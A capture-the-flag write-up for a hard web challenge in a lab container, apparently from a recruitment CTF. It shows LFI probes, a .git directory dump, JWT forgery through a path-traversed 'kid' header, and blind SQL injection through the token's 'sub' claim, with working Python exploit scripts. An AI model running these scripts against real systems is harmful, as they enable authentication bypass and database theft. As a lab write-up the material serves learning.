<h3>#2 Challenge: Secret Vexillology Society</h3> 
<pre>
<i>Level: Hard</i>
<i>Points: 300</i> 
</pre>

<img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/Secret%20Vexillology%20Society/screenshots/101.png" style="height: 80px;"><br>

<h4><i>Challenge description: </i></h4>
<blockquote>
<h5><i>Introduction</i></h5>
<p>
A secret vexillology society has shown up with a weird blog. They seem to have something huge coming up soon. Maybe you can find a way around their security and take a glance at it before they release it...
</p>
<h5><i>Goal</i></h5>
<p>
In this challenge you are supposed to find and exploit three issues:
<ol>
<li>
Leak the source code of the web page
</li>
<li>
Exploit a bug in the authentication logic to get access the admin panel
</li>
<li>
Exploit another bug to leak data from the database
</li>
</ol>
</p>
<h5><i>Hints</i></h5>
<ul>
<li>
The log in form does not contain any vulnerabilities
</li>
<li>
The credentials cannot be brute forced
</li>
<li>
The flag is currently only accepted while the container is running
</li>
<li>
If you get an invalid flag message, please restart the container and re-run the exploit
</li>
</ul>
</blockquote>

<h4><i>Intro</i></h4>

<p>
From the description of the challenge the goals seemed pretty straight forward. Upon starting the container and accessing the app I've started with simple observing. Application itself didn't seem to have much of a content, had a home page with 3 posts, a login form and that seemed pretty much it. It felt like leaking the source code will be a little bit of a hassle. 
</p>


<h4><i>Leaking the source code</i></h4>  
<p>
I inspected the page and there were no any kind of trails of some spicy JavaScript or anything that could be of any use. Just UI libraries like Bootstrap etc. As usual I've checked for <code>robots.txt</code> but there wasn't one. So it was time to use <a href="https://tools.kali.org/web-applications/dirbuster">DirBuster</a>
which is basically a bruteforce app for directories and files. The results were decent:<br><img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/Secret%20Vexillology%20Society/screenshots/dirbuster.png"/><br>
I navigated to /edit.php since it has responded with 200, and there were some errors on the page:  
</p>
<pre>
Notice: Undefined variable: user_obj in /var/www/html/edit.php on line 16

Notice: Trying to access array offset on value of type null in /var/www/html/edit.php on line 16

Notice: Undefined index: post_id in /var/www/html/edit.php on line 16

Warning: SQLite3::prepare(): Unable to prepare statement: 1, near "AND": syntax error in /var/www/html/inc/db.php on line 8

Fatal error: Uncaught Error: Call to a member function bindValue() on bool in /var/www/html/inc/db.php:11 Stack trace: #0 /var/www/html/inc/db.php(19): db_query() #1 /var/www/html/edit.php(16): db_query_single() #2 {main} thrown in /var/www/html/inc/db.php on line 11  
</pre>
<p>
Interesting, this definitely gave me info about the stack that is being used, it is Sqlite3 and it seems there are some prepared statements. I instantly thought about testing for LFI, but later on this will probably lead to some SQL injection.  

Typical LFI to start with <code>/edit.php?user_obj=../../.././../../../var/www/html/admin.php</code><br>
That didn't work so I tried <code>/edit.php?user_obj=php://filter/convert.base64-encode/resource=admin.php</code><br> Changing parameters from user_obj to post_id and trying to leak something all over again for various resources just didn't seem to work at all. As well I've tried other path traversals to other files with other known LFI techniques but without success. Slowly I was running out of ideas, other paths with 302 response were just redirecting back to index.php which wasn't of any use to me. After <b><i>hours</i></b> of thinking something came up to my mind randomly, I wanted to check if there was /.git/ directory or any kind of similar configs...<br>  
<code>/.git/</code> seemed to be forbidden which mean it exists, then I tried <code>/.git/config</code><br><br>
Guess what? Got the config content: <br>
</p>
<pre>
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[user]
	name = Secret Vexillology Master
	email = master@localhost
</pre>
<p>This made me think that I didn't use DirBuster properly or the wordlist wasn't right, because it didn't find<code>/.git/</code> directory, glad that I randomly stumbleupon it.<br></br>Ok from here this is source code disclosure via the git directory, which means that access is not restricted to that directory. This is a typical example of "Operational class vulnerability" as in bad configuration of the Apache server in this case. You can read more about about git disclosure <a href="https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/">here</a>.
<br>
To dump data from .git directory I've used <a href="https://github.com/internetwache/GitTools">GitTools.</a><br></br>After that I successfully git restored deleted source code files:<br></br>
<img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/Secret%20Vexillology%20Society/screenshots/gittools.png"/><br></br>
</p>

<h4><i>Authentication exploit</i></h4>
<p>
As seen there are a lot of restored files, they mentioned that login form didn't have any vulnerabilities. I've checked the login.php just in case and there was nothing interesting there.
</p>

```php
<?php
include('inc/init.php');

$login    = $_POST['username'];
$password = $_POST['password'];

if (!$login || !$password) {
        header('Location: /?err=Login+failed');
        die();
}

$user = db_query_single("SELECT * FROM users WHERE username = :login", array(
        ':login' => $login
));

if (!$user) {
        header('Location: /?err=Login+failed');
        die();
}
if (!password_verify($password, $user['password'])) {
        header('Location: /?err=Login+failed');
        die();
}
$jwt = get_token($user);
setcookie('session', $jwt);
header('Location: /');
```

Typical credentials check with Sqlite prepared statement. Next there was <code>/inc</code> directory with <code>auth.php</code> page, which contained some auth logic:


```php
<?php
require 'vendor/autoload.php';

use Lcobucci\JWT\Parser;
use Lcobucci\JWT\Builder;
use Lcobucci\JWT\Signer\Key;
use Lcobucci\JWT\Signer\Hmac\Sha384;

function get_token($user) {
    list($kid, $key) = get_key(NULL);

    $signer = new Sha384();
    $builder = new Builder();
    $token = $builder
        ->setKeyId($kid, true)
        ->setSubject($user['username'])
        ->set('name', $user['name'])
        ->sign($signer, $key)
        ->getToken();

    return strval($token);
}

function handle_auth() {
    if (isset($_COOKIE['session'])) {
        $parser = new Parser();
        $jwt = $parser->parse($_COOKIE['session']);
        list($kid, $key) = get_key($jwt->getHeader('kid'));
        $signer = new Sha384();
        if ($jwt->verify($signer, $key)) {
            return $jwt->getClaims();
        }
    }
}

function get_key($kid) {
    if (!$kid || !preg_match('/[a-f0-9]{32}/', $kid) || !file_exists('keys/' . $kid)) {
        $kid = readlink('keys/default');
    }

    return array($kid, new Key(file_get_contents('keys/' . $kid)));
}
```

First glance of it showed that the app was using JWT token for authentication along with some Lcobucci library. Without thoroughly analyzing at first, I was thinking that this might be something about the version of that library itself, maybe there was some known vulnerability that can be further exploited. I had <code>composer.lock </code> file:  
```json
 "packages": [
        {
            "name": "lcobucci/clock",
            "version": "1.4.0",
            "source": {
                "type": "git",
                "url": "https://github.com/lcobucci/clock.git",
                "reference": "fa02578087595043169e9f898d048802da510105"
            },
            "dist": {
                "type": "zip",
                "url": "https://api.github.com/repos/lcobucci/clock/zipball/fa02578087595043169e9f898d048802da510105",
                "reference": "fa02578087595043169e9f898d048802da510105",
                "shasum": ""
            },
            "require": {
                "php": "^7.4 || ^8.0"
            },
            "require-dev": {
                "infection/infection": "^0.17",
                "lcobucci/coding-standard": "^6.0",
                "phpstan/extension-installer": "^1.0",
                "phpstan/phpstan": "^0.12",
                "phpstan/phpstan-deprecation-rules": "^0.12",
                "phpstan/phpstan-phpunit": "^0.12",
                "phpstan/phpstan-strict-rules": "^0.12",
                "phpunit/phpunit": "^9.3"
            },
            "type": "library",
            "extra": {
                "branch-alias": {
                    "dev-master": "1.4-dev"
                }
            },
            "autoload": {
                "psr-4": {
                    "Lcobucci\\Clock\\": "src"
                }
            },
            "notification-url": "https://packagist.org/downloads/",
            "license": [
                "MIT"
            ],
            "authors": [
                {
                    "name": "Luís Cobucci",
                    "email": "lcobucci@gmail.com"
                }
            ],
            "description": "Yet another clock abstraction",
            "funding": [
                {
                    "url": "https://github.com/lcobucci",
                    "type": "github"
                },
                {
                    "url": "https://www.patreon.com/lcobucci",
                    "type": "patreon"
                }
            ],
            "time": "2020-08-27T17:13:08+00:00"
        },
        {
            "name": "lcobucci/jwt",
            "version": "3.0.5",
            "source": {
                "type": "git",
                "url": "https://github.com/lcobucci/jwt.git",
                "reference": "0935669796f0ecacebe93c19c99b3d0c82fda1cc"
            },
            "dist": {
                "type": "zip",
                "url": "https://api.github.com/repos/lcobucci/jwt/zipball/0935669796f0ecacebe93c19c99b3d0c82fda1cc",
                "reference": "0935669796f0ecacebe93c19c99b3d0c82fda1cc",
                "shasum": ""
            },
[...]
```

From this file we can see that <b>"lcobucci/jwt"</b> is <b>3.0.5</b> version. So I wanted to check if this specific version had vulnerabilities for JWT. For e.g i looked up if this specific version is protecting from <code><b>alg:none</b></code> check which is one of the ways of bypassing auth. But that wasn't the case:
```php
    protected function parseSignature(array $header, $data)
    {
        if ($data == '' || !isset($header['alg']) || $header['alg'] == 'none') {
            return null;
        }

        $hash = $this->decoder->base64UrlDecode($data);

        return new Signature($hash);
    }  
  
```
I wanted to take a look and see what is the content of <code>admin.php</code>. And how is <code>auth.php</code> being used there.

```php
<?php
include('inc/header.php');

if (!$user) {
  header('Location: /');
  die();
}

$posts_r = db_query("select * from posts where user_id = " . $user_obj['id'] . " order by id desc");

if (($post = $posts_r->fetchArray(SQLITE3_ASSOC))) {
  do {
?>
<div class="row">
<div class="card w-100 mt-4">
  <div class="card-body">
    <h5 class="card-title"><?= htmlentities($post['title']) ?></h5>
    <h6 class="card-subtitle mb-2 text-muted">Published on <?= substr($post['created_at'], 0, 10) ?></h6>
    <p class="card-text"><?= nl2br(htmlentities($post['content'])) ?></p>
  </div>
  <div class="card-footer text-muted">
    <a href="edit.php?post_id=<?= $post['id'] ?>">Edit post</a> | 
    <a href="delete.php?post_id=<?= $post['id'] ?>" onclick="return confirm('Are you sure?')">Delete post</a>
  </div>
</div>
</div>
<?php
} while (($post = $posts_r->fetchArray(SQLITE3_ASSOC)));
} else {
?>
<div class="alert alert-primary" role="alert">
  No posts found for user <?= $user_obj['id'] ?>
</div>
<?php
}
include('inc/footer.php');
```

It seems that very first check is for that <code>$user</code> variable which is being included <code>/inc/init.php</code> which looked like this:

```php
<?php
include('vendor/autoload.php');

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
ini_set('display_errors', true);

include_once('inc/auth.php');
include_once('inc/db.php');

$user = handle_auth();
if ($user) {
    $user_obj = db_query_single("select * from users where username = '{$user['sub']}'");
}
```

Alright <code>$user</code> variable has that <code>handle_auth()</code> which is returning us an object with JWT's claims. So it was time to re-analyze that <code>auth.php</code> file. Function <code>handle_auth()</code> is checking for the cookie session which is supposed to be JWT token, after that it is parsing the token and getting the key using <code>get_key($kid)</code> function from "kid" parameter and verifying the key with a signature that happens to be SHA 384. Taking a better look at <code>get_key($kid)</code> function it takes "kid" parameter from JWT, then it does check on it, if there is no $kid or if $kid is not matching regex pattern or if "kid" doesn't exist as file in <code>/keys/</code> directory set $kid to default symlink that is pointing to key id. After all kid is Header Parameter that is a hint indicating which key
was used to secure the JWS(JSON Web Signature). From RFC:
<blockquote>
<pre>
4.1.4.  "kid" (Key ID) Header Parameter

   The "kid" (key ID) Header Parameter is a hint indicating which key
   was used to secure the JWS.  This parameter allows originators to
   explicitly signal a change of key to recipients.  The structure of
   the "kid" value is unspecified.  Its value MUST be a case-sensitive
   string.  Use of this Header Parameter is OPTIONAL.

   When used with a JWK, the "kid" value is used to match a JWK "kid"
   parameter value.
</pre>
</blockquote>
<br>

The interesting part of that method was: <code>!preg_match('/[a-f0-9]{32}/', $kid)</code> which pretty much caught my eye. In PHP there are <code>preg_match()</code> and <code>preg_match_all()</code> methods for matching regex pattern however there is one quite significant difference between those:

<blockquote>
<pre>
<b>preg_match()</b>

Searches subject for a match to the regular expression given in pattern.
</pre>
<pre>
<b>preg_match_all()</b>

Searches subject for all matches to the regular expression given in pattern and puts them in matches in the order specified by flags.

After the first match is found, the subsequent searches are continued on from end of the last match
</pre>
</blockquote>

Which means that preg_match stops looking after first match while preg_match_all continues until it finishes processing the entire string.<br>

So as long as my "kid" parameter contains the string to match <code>'/[a-f0-9]{32}/'</code> regex pattern I will be able to bypass that check, next check would be <code>!file_exists('keys/' . $kid)</code> to bypass that it's pretty obvious that we can craft "kid" as a path traversal since file_exist is not sanitized by any mean. But I don't know the id of the key file unfortunately, so it took me a little bit to realize how I can use this as leverage. It is not obvious on the first site( at least it wasn't for me lol) but at the end it is quite simple, just thinking outside of the box.  

The question is:<br></br><br></br> - What do I control from this point?

I know that I can craft JWT with "kid" header parameter like: "aaaabbbbaaaabbbbaaaabbbbaaaabbbb", and that would bypass <code>preg_match()</code> but not <code>file_exists()</code> obviously because the file with that name doesn't exist, all what I had to do is to traverse to a file that existed on the server that I knew of. After some thinking and <b><i>numerous</i></b> fail attempts, an idea came to my mind.<br>
Remembering that I dumped git directory along with some other directories, what I am talking about are git <a href="https://git-scm.com/book/en/v2/Git-Internals-Git-Objects">Blobs</a> which are corresponding to inodes or file contents. They are represented with SHA-1 as hex which is ideally what I needed for that regex pattern.<br>
<img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/Secret%20Vexillology%20Society/screenshots/git_objects.png"/>
<br>
<img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/Secret%20Vexillology%20Society/screenshots/git_blob.png"/>

I made a script in Python to test it:  

```python

import requests
import json
import jwt

s = requests.Session()
s.keep_alive = False
h = {"Accept":"*/*","Accept-Encoding":"gzip, deflate","User-Agent":"Mozilla/5.0"}
url2 = "https://5f0df7f0-9d18-4797-bb6a-3ac7af2e7590.idocker.vuln.land/admin.php"
obj = ".git/objects/b0/e27f6adff54c677d31825edcd75bb6d0e8763e"

with open("e27f6adff54c677d31825edcd75bb6d0e8763e","rb") as f:
    content = f.read()

def log(url):
    token = jwt.encode({"sub":"admin", "name":"Admin", "admin":True}, key=content, algorithm="HS384", headers={"kid":f"../{obj}"})
    cookies = {"session":token}
    r = s.get(url,cookies=cookies)
    if r.status_code == 200:
      print("Logged in as admin!", token)

log(url2)

```

It seems that worked, I've wanted to access it in a browser with the token that I crafted:<br>
<code> eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzM4NCIsImtpZCI6Ii4uLy5naXQvb2JqZWN0cy9iMC9lMjdmNmFkZmY1NGM2NzdkMzE4MjVlZGNkNzViYjZkMGU4NzYzZSJ9.eyJzdWIiOiJhZG1pbiIsIm5hbWUiOiJBZG1pbiIsImFkbWluIjp0cnVlfQ.x8yNHEAT1gafpdszqmUQ61vK6tKXI4yxOMx1sFFsbLKHgLL1UYJiEAkH03Q424sH
</code>

<img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/Secret%20Vexillology%20Society/screenshots/admin_log.png"/>

Successfully bypassed auth logic.

<br>
<h4><b><i>Getting the flag</i></b></h4>
<p>
Last step was leaking the data from the database. After successfully bypassing the flag I was able to edit posts that were made. I've checked the source code of <code>edit.php</code>  

```php
<?php
include('inc/header.php');

if (!empty($_POST)) {
    db_query("update posts set title = :title, content = :content where user_id = :user_id and id = :id", array(
        ':title' => $_POST['title'],
        ':content' => $_POST['content'],
        ':user_id' => $user_obj['id'],
        ':id' => $_POST['post_id']
    ));

    header('Location: /edit.php?post_id=' . $_POST['post_id']);
    die();
}

$post = db_query_single("select * from posts where user_id = " . $user_obj['id'] . " AND id = :id", array(':id' => $_REQUEST['post_id']));

?>
<div class="row">
<div class="card w-100 p-3 m-3">
<form method="post" action="edit.php">
  <input type="hidden" name="post_id" value="<?= $post['id'] ?>">
  <div class="form-group">
    <label for="title">Title</label>
    <input type="text" class="form-control" id="title" name="title" value="<?= htmlspecialchars($post['title']) ?>">
  </div>
  <div class="form-group">
    <label for="content">Content</label>
    <textarea class="form-control" id="content" name="content" rows="6"><?= htmlentities($post['content']) ?></textarea>
  </div>
  <button type="submit" class="btn btn-primary">Submit</button>
</form>
</div>
</div>
<?php
include('inc/footer.php');

```

As seen from the code there are 2 methods for performing SQL queries: db_query and db_query_single. I quickly checked <code>/inc/db.php</code>

```php
<?php
global $db_conn;

$db_conn = new SQLite3('data/app.db');

function db_query($sql, $params = NULL) {
    global $db_conn;
    $stmt = $db_conn->prepare($sql);
    if ($params) {
        foreach ($params as $key => $value) {
            $stmt->bindValue($key, $value);
        }
    }

    return $stmt->execute();
}

function db_query_single($sql, $params = NULL) {
    return db_query($sql, $params)->fetchArray(SQLITE3_ASSOC);
}
```

It was SQLite3 and those 2 methods were definitely wrappers for <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#defense-option-1-prepared-statements-with-parameterized-queries">prepared statements</a>. So I didn't see the space for SQL injection on that <code>edit.php</code> page. I've analyzed other files and there was one interesting line in <code>/inc/init.php</code>  

```php
if ($user) {
    $user_obj = db_query_single("select * from users where username = '{$user['sub']}'");
}
```
It seems whatever is in JWT's <a href="https://datatracker.ietf.org/doc/html/rfc7519#section-4.1.2">Sub claim</a> will be embedded directly to the query and not as a parameter to be bound. Which means that prepared statement is not going to protect that query from SQL injection. I've also checked if $user_obj is being displayed somewhere in the html and that was not the case, so I will not be able to see the output of sql injection that I am going to test against. From this it is clear this will be <i>Blind SQL injection</i>.
</p><br>

<h4><b><i>Blind SQL injection</i></b></h4>
<p>
First I had to craft JWT with "Sub" claim that included my injection and to confirm this is blind approach.Using the same method from before to login as admin just modified the sub claim:<br>


```python

import requests
import json
import jwt

s = requests.Session()
s.keep_alive = False
h = {"Accept":"*/*","Accept-Encoding":"gzip, deflate","User-Agent":"Mozilla/5.0"}
url2 = "https://5f0df7f0-9d18-4797-bb6a-3ac7af2e7590.idocker.vuln.land/admin.php"
obj = ".git/objects/b0/e27f6adff54c677d31825edcd75bb6d0e8763e"

with open("e27f6adff54c677d31825edcd75bb6d0e8763e","rb") as f:
    content = f.read()

def log(url):
    token = jwt.encode({"sub":f"admin' AND 1=1 --", "name":"Admin", "admin":True}, key=content, algorithm="HS384", headers={"kid":f"../{obj}"})
    cookies = {"session":token}
    r = s.get(url,cookies=cookies)
    if r.status_code == 200:
      print("Logged in as admin!", r.text, token)
    else:
      print("Failed")

log(url2)

```

That seemed to work fine for authentication wise and it seemed that query got executed:   

```html
Logged in as admin! <!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="version" content="3b026b2ca99eebcb317f726e7841672c441047d5 Release Version 1.0 by Secret Vexillology Master on 2021-03-10 14:01:40 +0000">
  <title>Secret Vexillology Society</title>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
</head>
<body>
<nav class="navbar navbar-expand-lg navbar-light bg-light">
  <a class="navbar-brand" href="/">Secret Vexillology Society</a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="navbarSupportedContent">
    <ul class="navbar-nav mr-auto">
      <li class="nav-item active">
        <a class="nav-link" href="/">Home</a>
      </li>
            <li class="nav-item active">
        <a class="nav-link" href="/admin.php">My posts</a>
      </li>
          </ul>
          <ul class="navbar-nav mr-auto mt-2 mt-lg-0">
      <li class="nav-item">
        <a class="nav-link disabled" href="#" tabindex="-1" aria-disabled="true">Welcome Admin</a>
      </li>
        <li class="nav-item active">
          <a class="nav-link" href="logout.php">Logout</a>
        </li>
      </ul>
      </div>
</nav>
<div class="container">
<div class="row">
<div class="card w-100 mt-4">
  <div class="card-body">
    <h5 class="card-title">Update</h5>
    <h6 class="card-subtitle mb-2 text-muted">Published on 2021-05-09</h6>
    <p class="card-text">Just wanted to quickly let you know that I'm working on a secret new flag design which I will release soon. Just here on this site!</p>
  </div>
  <div class="card-footer text-muted">
    <a href="edit.php?post_id=3">Edit post</a> | 
    <a href="delete.php?post_id=3" onclick="return confirm('Are you sure?')">Delete post</a>
  </div>
</div>
</div>
<div class="row">
<div class="card w-100 mt-4">
  <div class="card-body">
    <h5 class="card-title">Very busy</h5>
    <h6 class="card-subtitle mb-2 text-muted">Published on 2021-05-06</h6>
    <p class="card-text">Yeah, I know. There is not much going on here. Sorry about that. I am currently very busy with work and implementing the next version of my blog backend. Gotta fix some issues I found in testing. Stay tuned!</p>
  </div>
  <div class="card-footer text-muted">
    <a href="edit.php?post_id=2">Edit post</a> | 
    <a href="delete.php?post_id=2" onclick="return confirm('Are you sure?')">Delete post</a>
  </div>
</div>
</div>
<div class="row">
<div class="card w-100 mt-4">
  <div class="card-body">
    <h5 class="card-title">Blog finished</h5>
    <h6 class="card-subtitle mb-2 text-muted">Published on 2021-04-28</h6>
    <p class="card-text">I finally found the time to finish the blog for the Secret Vexillology Society. Enjoy your stay here!</p>
  </div>
  <div class="card-footer text-muted">
    <a href="edit.php?post_id=1">Edit post</a> | 
    <a href="delete.php?post_id=1" onclick="return confirm('Are you sure?')">Delete post</a>
  </div>
</div>
</div>
</div>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</body>
</html>
 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzM4NCIsImtpZCI6Ii4uLy5naXQvb2JqZWN0cy9iMC9lMjdmNmFkZmY1NGM2NzdkMzE4MjVlZGNkNzViYjZkMGU4NzYzZSJ9.eyJzdWIiOiJhZG1pbicgQU5EIDE9MSAtLSIsIm5hbWUiOiJBZG1pbiIsImFkbWluIjp0cnVlfQ.Siuz5R3rt9ceIGpuyfl9EzxsVv6Sh-5oOjpYI9hWw_VOwsLISI4fffmavjE7XPhQ
```
</p>
<p>
However when I tested it for fail response with <code>admin' AND 1=2 --</code> I got:

```html
Logged in as admin! <!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="version" content="3b026b2ca99eebcb317f726e7841672c441047d5 Release Version 1.0 by Secret Vexillology Master on 2021-03-10 14:01:40 +0000">
  <title>Secret Vexillology Society</title>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
</head>
<body>
<nav class="navbar navbar-expand-lg navbar-light bg-light">
  <a class="navbar-brand" href="/">Secret Vexillology Society</a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="navbarSupportedContent">
    <ul class="navbar-nav mr-auto">
      <li class="nav-item active">
        <a class="nav-link" href="/">Home</a>
      </li>
            <li class="nav-item active">
        <a class="nav-link" href="/admin.php">My posts</a>
      </li>
          </ul>
          <ul class="navbar-nav mr-auto mt-2 mt-lg-0">
      <li class="nav-item">
        <a class="nav-link disabled" href="#" tabindex="-1" aria-disabled="true">Welcome Admin</a>
      </li>
        <li class="nav-item active">
          <a class="nav-link" href="logout.php">Logout</a>
        </li>
      </ul>
      </div>
</nav>
<div class="container">
<br />
<b>Notice</b>:  Trying to access array offset on value of type bool in <b>/var/www/html/admin.php</b> on line <b>9</b><br />
<br />
<b>Warning</b>:  SQLite3::prepare(): Unable to prepare statement: 1, near &quot;order&quot;: syntax error in <b>/var/www/html/inc/db.php</b> on line <b>8</b><br />
<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function execute() on bool in /var/www/html/inc/db.php:15
Stack trace:
#0 /var/www/html/admin.php(9): db_query()
#1 {main}
  thrown in <b>/var/www/html/inc/db.php</b> on line <b>15</b><br />
 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzM4NCIsImtpZCI6Ii4uLy5naXQvb2JqZWN0cy9iMC9lMjdmNmFkZmY1NGM2NzdkMzE4MjVlZGNkNzViYjZkMGU4NzYzZSJ9.eyJzdWIiOiJhZG1pbicgQU5EIDE9MiAtLSIsIm5hbWUiOiJBZG1pbiIsImFkbWluIjp0cnVlfQ.Pjy6XNk0hag_g4DOO1pF1PzG1rxA2PZaxsQ5Y2VDbib9bPw4dh2zBylvffZWhjKZ
```

It did return 200 status code which means that auth succeeded with that error Stack trace, which concludes this is blind sql injection, but I had to modify that script for better error handling.<br>  
Now it was pretty much time to start enumerating database and search for that flag, luckily we had <code>/data/create.sql</code>:  

```sql
CREATE TABLE users (
  id integer primary key autoincrement,
  username varchar(30),
  name varchar(255),
  password varchar(255)
);

CREATE TABLE secrets (
  id integer primary key autoincrement,
  key varchar(30),
  value varchar(255)
);

CREATE TABLE posts (
  id integer primary key autoincrement,
  user_id integer,
  created_at date,
  title varchar(255),
  content text,
  foreign key (user_id) references user(id)
);
```
That might speed up the process. My first target was secrets, I’ve started off with checking the value of secret with id of 1.  

```python
import requests
import json
import jwt
import string

s = requests.Session()
s.keep_alive = False
h = {"Accept":"*/*","Accept-Encoding":"gzip, deflate","User-Agent":"Mozilla/5.0"}
url2 = "https://a269e18a-bb48-4fc7-bf26-0202b7876fb6.idocker.vuln.land/admin.php"
obj = ".git/objects/b0/e27f6adff54c677d31825edcd75bb6d0e8763e"
with open("e27f6adff54c677d31825edcd75bb6d0e8763e","rb") as f:
    content = f.read()

def q(url):
  chrs = [w for w in string.printable[:-5]]
  flag = f""
  for l in range(1,255):
    for c in chrs: 
      token = jwt.encode({"sub":f"admin' AND (SELECT substr(value,{l},1)='{c}' FROM secrets WHERE secrets.id=1) -- ", "name":"Broken", "admin":True}, key=content, algorithm="HS384", headers={"kid":f"../{obj}"})
      cookies = {"session":token}
      r = s.get(url,cookies=cookies) 
      if("Edit post" in r.text):
        print(f"letter {l} is: ", c )
        flag += c
        break
    if l != len(flag):
      print("final result ",flag)
      break
    print("current result:",flag)

```
I modified the script with some "better handling"..<br>
result was : <code>8ab261ed1a4f2cb73d091920d27ebc6b54b5ea474ba5fafa99a42ed35668</code><br>
Unfortunately that wasn't the flag, the system didn't accept it, I kept going on for the first ~10 ids.

And it seems I only got values for first 5, though I did check for key values as well so this were the results:

<ul>
<li>id 1 key: secret-key | value: 8ab261ed1a4f2cb73d091920d27ebc6b54b5ea474ba5fafa99a42ed35668</li>

<li>id 2 key: random seed | value: 1337</li>

<li>id 3 key: fubar | value: null</li>

<li>id 4 key: nonce | value : totally unique</li>

<li>id 5 key:important link value: rickroll youtube link was here heh</li>
</ul>

Before enumerating all values in secrets I quickly wanted to make sure that flag is not admin's password.<br>

Payload: <code><i>"admin' AND (SELECT substr(password,{l},1)='{c}' FROM users WHERE username='admin') --"</i></code><br><br>


Password : $2y$10$RmlNXFHqCp0thBE.cpvDqu1ESXlDTr9mIFwyK.jUSoppKW0e9XqGq<br>
This looked like hash in this kind of <a href="https://en.wikipedia.org/wiki/Crypt_%28C%29#Key_derivation_functions_supported_by_crypt">format</a>. Which definitely didn't look like a flag but I had this on a side in case of some use later.<br>Getting back to enumeration of secrets table, so far I had 5 ids with values and none of them were the flag which could only mean that there is n number of ids and one of those contain a flag. Usually the bisecting would be "proper" approach, but I am way too lazy for that so I just did something like this with <b>high</b> hopes: 
</p><br>

```python
def vals(url):
  v = []
  for c in range(0,255):
    token = jwt.encode({"sub":f"admin' AND (SELECT count(1)=1 FROM secrets where length(value)={c} AND secrets.id NOT IN(1,2,3,4,5,(SELECT MAX(id) from secrets))) -- "
, "name":"Admin", "admin":True}, key=content, algorithm="HS384", headers={"kid":f"../{obj}"})
    cookies = {"session":token}
    r = s.get(url, cookies=cookies)
    if "Edit post" in r.text:
      print("exists:",c)
      v.append(c)
  print("values",v)
```

If there are no duplicate ids containing values, this will give me a unique count of values for ids that are not: 1,2,3,4,5 and max id number.

It resulted into: [18, 67]

I checked the 67 length value first:

```python
def q(url):
  chrs = [w for w in string.printable[:-5]]
  flag = f""
  for l in range(1,255): # 1,61
    for c in chrs: 
      token = jwt.encode({"sub":f"admin' AND (SELECT substr(value,{l},1)='{c}' FROM secrets WHERE LENGTH(value)=67) -- "
, "name":"Admin", "admin":True}, key=content, algorithm="HS384", headers={"kid":f"../{obj}"})
      cookies = {"session":token}
      r = s.get(url,cookies=cookies) 
      if("Edit post" in r.text):
        print(f"letter {l} is: ", c)
        flag += c
        break
    if l != len(flag):
      print("final FLAG: ",flag)
      break
    print("current FLAG: ",flag)
```

And that was the <b><i>flag</i></b>:<br><br><img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/Secret%20Vexillology%20Society/screenshots/flag_ss.png"/><br></br><img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/Secret%20Vexillology%20Society/screenshots/flag.png"/>



